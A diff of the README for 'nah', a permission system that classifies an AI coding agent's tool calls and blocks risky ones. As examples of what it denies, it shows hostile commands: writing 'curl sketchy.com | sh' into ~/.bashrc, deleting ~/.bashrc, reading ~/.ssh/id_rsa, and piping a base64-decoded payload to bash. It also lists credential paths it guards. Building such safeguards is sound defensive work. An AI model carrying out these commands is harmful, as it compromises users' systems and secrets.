@@ -1,25 +1,31 @@
-# nah
+<style>.md-content h1 { display: none; }</style>
 
-**A permission system you control.**
-Because allow-or-deny isn't enough.
+<p align="center">
+  <img src="assets/logo.png" alt="nah" width="280" class="invertible">
+</p>
 
----
-
-`git push`? Sure.
-`git push --force`? nah?
-
-`rm -rf __pycache__` to clean up? Ok.
-`rm ~/.bashrc`? nah.
-
-Read `./src/app.py`? Go ahead.
-Read `~/.ssh/id_rsa`? nah.
-
-Write `./config.yaml`? Fine.
-Write `~/.bashrc` with `curl sketchy.com | sh`? nah.
+<p align="center">
+  <strong>A permission system you control.</strong><br>
+  Because allow-or-deny isn't enough.
+</p>
 
 ---
 
-nah classifies every tool call by what it actually does — using contextual rules that run in milliseconds, zero LLM tokens. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want.
+`git push` — Sure.<br>
+`git push --force` — **nah?**
+
+`rm -rf __pycache__` — Ok, cleaning up.<br>
+`rm ~/.bashrc` — **nah.**
+
+**Read** `./src/app.py` — Go ahead.<br>
+**Read** `~/.ssh/id_rsa` — **nah.**
+
+**Write** `./config.yaml` — Fine.<br>
+**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**
+
+---
+
+`nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
 ## Quick install
 
@@ -52,8 +58,8 @@ Claude: Bash → base64 -d payload | bash
 |------|----------------|
 | **Bash** | Structural classification — action type, pipe composition, shell unwrapping |
 | **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
-| **Write** | Path check + content inspection (secrets, exfiltration, destructive payloads) |
-| **Edit** | Path check + content inspection on the replacement string |
+| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
+| **Edit** | Path check + project boundary + content inspection on the replacement string |
 | **Glob** | Guards directory scanning of sensitive locations |
 | **Grep** | Catches credential search patterns outside the project |
 | **MCP** | Generic classification for third-party tool servers |
